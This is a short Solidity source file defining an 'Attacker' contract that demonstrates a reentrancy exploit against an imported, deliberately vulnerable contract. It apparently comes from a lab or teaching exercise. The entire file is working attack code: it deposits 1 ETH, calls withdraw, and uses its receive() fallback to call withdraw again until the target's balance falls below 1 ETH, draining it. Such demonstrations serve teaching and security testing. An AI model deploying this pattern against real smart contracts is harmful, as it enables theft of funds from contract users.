// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./Reentrancy.sol";

contract Attacker {
    ReentrancyVulnerable public target;

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    // deposit into target
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    // fallback gets triggered during reentrancy
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}